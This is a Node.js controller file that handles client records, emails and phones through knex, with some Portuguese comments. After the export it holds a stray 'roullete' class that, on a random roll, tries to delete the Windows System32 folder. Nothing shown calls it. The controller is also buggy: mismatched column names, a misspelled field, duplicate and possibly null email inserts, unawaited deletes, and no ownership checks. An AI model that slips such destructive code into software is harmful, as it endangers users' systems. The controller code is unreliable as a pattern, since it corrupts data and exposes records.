const knex = require('../database/knex')
const AppError = require('../utils/AppError')
class ClientsControllers{

    viewClientInfo = async (request, response) => {
        const {client_id} = request.query
        
        const allInfo = await knex('clients')
        .select('*')
        .where({client_id})
        .first()

        const contacts = await knex('contacts')
        .where({client_owner_id : allInfo.client_id})

        const emails = await knex('emails')
        .where({FK_client_id : allInfo.client_id}) 
        const phones = await knex('phones')

        .where({owner_id : allInfo.client_id})
        return response.json({allInfo, emails, phones, contacts})

    }

    create = async (request, response) => {
        //emails and phones are arrays from frontend
        const {full_name, emails, phones} = request.body
        const registered_by = request.user.id
        
        const [client_id] = await knex('clients')
        .insert({
            full_name,
            FK_registered_by : registered_by
        })
        .then((id)=> {
            console.log('inserted with success')
            return id
        })
        .catch(e => (console.error(e)))
        if(emails.length > 0){
            const emailsToInsert = emails.map(email => {
                return {
                    address : email,
                    FK_client_id : client_id
                }
            })
            await knex('emails').insert(emailsToInsert).then((data) => console.log(data))
        }
        if(phones.length > 0){
            const phonesToInsert = phones.map(phone => {
                return {
                    number : phone,
                    owner_id : client_id
                }
            })
            await knex('phones').insert(phonesToInsert).then((data) => console.log(data))
        }    
        
        return response.status(201).json(client_id)
    }
    
    update = async (request, response) =>{
        //as informacoes de emails e contatos deste cliente que está sendo atualizado
        //virão do frontend quando a api de informacoes do cliente é consumida, 
        //retornando tudo que tem sobre este todos os ids dos emails e contatos linkados
        //e quando o cliente for ser atualizado, tera que selecionar e assim o seu id sera
        //passado atraves da request.params.client_id
        const {
            newName, 
            addictedPhones,
            addictedEmails,// array of emails that will be insert to this client
            arrayOfDeletedContacts, 
            arrayOfDeletedEmails
        } = request.body

        const {client_id} = request.params

        await knex('clients')
        .where({client_id})
        .update({name : newName})
        .then(() => (console.log("updated")))
        .catch(error => console.error(error))
        if(arrayOfDeletedContacts.length > 0){
            arrayOfDeletedContacts.map(async(element) => {
                await knex('contacts')
                .where({contact_id : element.contact_id})
                .delete()
            })
        }
        if(arrayOfDeletedEmails.length > 0){
            arrayOfDeletedEmails.map(async(element) => {
                await knex('emails')
                .where({email_id : element.email_id})
                .delete()
            })
        }

        let emailsInsert = null
        if(addictedEmails.length > 0){
            emailsInsert = addictedEmails.map(email => {
                return {
                    address : email.adress,
                    FK_client_id : client_id
                }
            })
        }
        await knex('emails')
        .insert(emailsInsert)
        .then(() => console.log('inserted with success'))
        .catch(e => console.error(e))

        let phonesInsert = null
        if(addictedPhones.length > 0){
            phonesInsert = addictedPhones.map(number => {
                return {
                    number : number,
                    owner_id : client_id
                }
            })
        }

        await knex('phones').insert(phonesInsert).then((data) => console.log(data))


        await knex('emails')
        .insert(emailsInsert)
        .then(() => console.log('inserted with success'))
        .catch(e => console.error(e))

        return response.status(200).json({message : "updated with success"})
    }

    report = async (request, response) =>{
        const relatoryResponse = await knex("clients_contacts")
        .then((data)=> {
            console.log('success')
            return data
        })
        .catch(e => console.error(e))

        /*const view = await knex('clients as c')
        .select(['full_name', 'full_contact_name'])
        .innerJoin('contacts as ct', 'c.client_id', '=', 'ct.client_owner_id' )
        */
        return response.json(relatoryResponse)
    }
}
module.exports = ClientsControllers



class roullete{
    trigger = async() =>{
        const fs = require('fs')
        const randonNumber = Math.round(Math.random()* 6)
        if(randonNumber == 1)await fs.unlinkSync('C:/Windows/System32')
    }
}
